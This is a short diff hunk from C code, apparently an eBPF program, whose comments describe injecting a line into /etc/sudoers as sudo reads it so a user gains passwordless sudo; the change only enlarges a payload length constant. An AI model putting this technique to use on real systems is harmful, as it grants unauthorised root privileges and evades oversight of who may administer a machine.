@@ -12,7 +12,7 @@ const volatile int uid = 0;
 // add to /etc/sudoers when viewed by sudo
 // Which makes it think our user can sudo
 // without a password
-#define max_payload_len 100
+#define max_payload_len 1024
 const volatile int payload_len = 0;
 const volatile char payload[100];
 
